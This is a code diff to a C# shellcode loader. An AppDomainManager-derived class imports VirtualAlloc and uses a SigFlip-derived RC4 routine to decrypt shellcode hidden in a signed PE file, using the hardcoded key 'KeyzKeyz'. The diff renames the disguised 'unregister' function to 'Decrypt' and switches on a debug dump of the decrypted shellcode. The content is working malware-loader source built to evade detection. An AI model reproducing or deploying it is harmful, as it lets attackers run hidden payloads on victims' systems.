@@ -15,8 +15,8 @@ public sealed class Assembly : AppDomainManager
 
 public class codebase 
 {
-	[DllImport("kernel32")]
-	private static extern IntPtr VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
+    [DllImport("kernel32")]
+    private static extern IntPtr VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
 	
     [DllImport("kernel32.dll")]
     private static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);
@@ -54,7 +54,7 @@ public class codebase
     }
 
     // Decryption function from SigFlip
-    public static byte[] unregister(byte[] data, string encKey)
+    public static byte[] Decrypt(byte[] data, string encKey)
     {
         byte[] T = new byte[256];
         byte[] S = new byte[256];
@@ -158,11 +158,10 @@ public class codebase
         //stream.Read(regfile, 0, (_peBlob.Length+2) - ((int)pos + tag.Length));
 
         // Decryption routine - Replace the below hardcoded key with your password
-        byte[] assemblyFile = unregister(regfile, "KeyzKeyz");
+        byte[] assemblyFile = Decrypt(regfile, "KeyzKeyz");
 
         // Output decrypted shellcode to file for comparison to original shellcode
-        // UNCOMMENT below line to debug decrytped shellcode
-        //WriteFile(".\\debug-DecryptedScode.txt", assemblyFile);
+        WriteFile(".\\debug-DecryptedScode.txt", assemblyFile);
         	
         stream.Close();
 
